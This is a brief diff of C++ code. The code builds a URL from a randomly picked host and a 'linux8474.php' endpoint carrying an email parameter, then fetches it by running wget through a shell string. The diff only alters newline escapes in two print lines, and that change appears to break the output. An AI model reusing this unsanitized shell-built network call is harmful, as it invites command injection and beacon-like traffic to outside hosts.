@@ -978,7 +978,7 @@ int rand_index = rand() % 10;
 
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux8474&linux84744474=linuxdistro84@gmail.com";
     
-    cout << url << "\n";
+    cout << url << "\\n";
     
     response = GetStdoutFromCommand("wget -q -U 'linux84' -O - '"+url+"'");
     
@@ -1028,7 +1028,7 @@ int rand_index = rand() % 10;
  
     string url = "http://" + random[rand_index] + "/linux8474.php?linux84=linux84";
     
-    cout << url << "\nlinux84\n";
+    cout << url << "\\nlinux84\\n";
     
     string response;
     
